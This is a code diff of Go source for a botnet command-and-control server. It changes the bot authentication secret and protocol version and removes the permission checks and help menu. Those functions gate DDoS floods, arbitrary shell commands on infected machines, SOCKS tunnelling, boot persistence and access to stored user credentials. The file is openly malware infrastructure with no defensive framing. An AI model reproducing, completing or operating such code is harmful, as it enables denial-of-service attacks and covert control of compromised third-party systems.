@@ -25,8 +25,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "z!RDnjvvXHWDX^sq"
-	PROTOCOL_VERSION = "proto59"
+	MAGIC_CODE       = "1Kxah27lJg#ptaVo"
+	PROTOCOL_VERSION = "v5.7.19"
 )
 
 type BotConnection struct {
@@ -92,105 +92,6 @@ var (
 	clients    = []*client{}
 	maxAttacks = 20
 )
-
-// ============================================================================
-// PERMISSION CHECKING FUNCTIONS
-// Role-based access control for CNC commands. Each function checks if the
-// authenticated user has sufficient privileges for specific command categories.
-// Permission levels from lowest to highest: Basic < Pro < Admin < Owner
-// ============================================================================
-
-// canUseDDoS checks if user can execute attack commands (UDP, TCP, HTTP floods)
-// Minimum required level: Basic (all authenticated users can use DDoS)
-// This is the most permissive check - anyone with valid login can attack
-func (c *client) canUseDDoS() bool {
-	// Basic users can only use DDoS commands
-	level := c.user.GetLevel()
-	return level == Basic || level == Pro || level == Admin || level == Owner
-}
-
-// canUseShell checks if user can execute shell commands on bots (!shell, !exec)
-// Minimum required level: Admin (elevated privilege required for code execution)
-// Shell access is dangerous - can run arbitrary commands on all bots
-// Also gates SOCKS proxy commands which tunnel traffic through bots
-func (c *client) canUseShell() bool {
-	// Shell commands require Admin or higher due to security risk
-	level := c.user.GetLevel()
-	return level == Admin || level == Owner
-}
-
-// canUseBotManagement checks if user can manage bot lifecycle (reinstall, kill, persist)
-// Minimum required level: Admin
-// These commands affect bot availability for all users:
-// - !reinstall: Forces bot to re-download and reinstall itself
-// - !lolnogtfo: Kills and removes bot (destructive action)
-// - !persist: Sets up boot persistence on infected systems
-func (c *client) canUseBotManagement() bool {
-	// Bot management requires Admin or Owner level privileges
-	level := c.user.GetLevel()
-	return level == Admin || level == Owner
-}
-
-// canUsePrivate checks if user can access owner-only features
-// Minimum required level: Owner (highest privilege level)
-// Private commands include:
-// - Database access (view all user credentials)
-// - System configuration commands
-// - Any future sensitive operations
-func (c *client) canUsePrivate() bool {
-	// Private commands require Owner only - no delegation
-	level := c.user.GetLevel()
-	return level == Owner
-}
-
-// canTargetSpecificBot checks if user can send commands to individual bots
-// Minimum required level: Pro
-// By default, commands go to ALL bots. This permission allows:
-// - Targeting specific bot by ID: !abc123 <command>
-
-func (c *client) canTargetSpecificBot() bool {
-	// Targeting specific bots requires Pro or higher level
-	level := c.user.GetLevel()
-	return level == Pro || level == Admin || level == Owner
-}
-
-// ============================================================================
-// HELP MENU SYSTEM
-// Dynamically generates help menus based on user's permission level.
-// Only shows commands the user is authorized to execute.
-// Uses ANSI escape codes for colored terminal output.
-// ============================================================================
-
-func (c *client) showHelpMenu(conn net.Conn) {
-	c.writeHeader(conn) // Top border with user level
-
-	// All authenticated users see general commands
-	if c.canUseDDoS() {
-		c.writeGeneralCommands(conn)
-	}
-
-	// Admin+ sees shell commands
-	if c.canUseShell() {
-		c.writeShellCommands(conn)
-	}
-
-	// Pro+ sees bot targeting
-	if c.canTargetSpecificBot() {
-		c.writeBotTargeting(conn)
-	}
-
-	// Admin+ sees bot management
-	if c.canUseBotManagement() {
-		c.writeBotManagement(conn)
-	}
-
-	// Owner only sees private commands
-	if c.canUsePrivate() {
-		c.writePrivateCommands(conn)
-	}
-
-	c.writeFooter(conn) // Bottom border
-}
 
 // ============================================================================
 // MAIN ENTRY POINT
